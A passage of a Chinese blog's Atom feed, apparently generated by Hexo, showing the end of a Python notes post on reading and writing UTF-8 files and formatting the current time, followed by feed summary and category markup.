href="#1-读文件" class="headerlink" title="1.读文件"></a>1.读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(filename,&apos;r&apos;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">s = fp.read()</span><br></pre></td></tr></table></figure><h3 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2.写文件"></a>2.写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;D:/hexo/source/_posts/%s&quot; % filename,&apos;w&apos;,encoding=&quot;UTF-8&quot;) as f:</span><br><span class="line">f.write(result)</span><br></pre></td></tr></table></figure><h3 id="3-注意"><a href="#3-注意" class="headerlink" title="3.注意"></a>3.注意</h3><p>记得加encoding=”UTF-8”，不然会出现乱码问题。</p><h2 id="四、获取当前时间"><a href="#四、获取当前时间" class="headerlink" title="四、获取当前时间"></a>四、获取当前时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、压缩与解压&quot;&gt;&lt;a href=&quot;#一、压缩与解压&quot; class=&quot;headerlink&quot; title=&quot;一、压缩与解压&quot;&gt;&lt;/a&gt;一、压缩与解压&lt;/h2&gt;&lt;p&gt;导入相应模块&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
</feed>
